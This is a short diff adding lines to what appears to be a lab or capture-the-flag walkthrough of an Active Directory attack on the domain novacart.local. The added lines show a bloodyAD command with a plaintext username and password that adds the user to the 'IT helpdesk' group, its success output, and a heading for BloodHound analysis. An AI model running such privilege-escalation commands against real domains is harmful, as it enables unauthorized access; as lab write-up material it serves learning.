@@ -721,3 +721,11 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 Now i should be able to add myself to the group
 
+```python
+bloodyAD --host dc.novacart.local -d novacart.local -u j.dillon -p 'novafire2008' add groupMember 'IT helpdesk' 'j.dillon'    
+
+[+] j.dillon added to IT helpdesk
+```
+The current user is now in the helpdesk group
+
+# Bloodhound on `IT HELPDESK`
